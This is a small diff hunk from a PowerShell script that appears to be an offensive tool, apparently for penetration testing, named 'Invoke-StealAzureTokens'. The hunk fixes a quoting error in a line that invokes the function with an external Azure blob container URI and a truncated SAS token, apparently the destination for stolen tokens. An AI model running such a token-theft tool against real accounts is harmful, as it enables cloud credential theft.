@@ -71,7 +71,7 @@ function Invoke-StealAzureTokens {
     }
 }
 
-Invoke-StealAzureTokens -ContainerUri 'https://pentestexample.blob.core.windows.net/test' -SasToken 'sv=2022-11..
+Invoke-StealAzureTokens -ContainerUri 'https://pentestexample.blob.core.windows.net/test' -SasToken 'sv=2022-11..'
 
 <#
     .SYNOPSIS
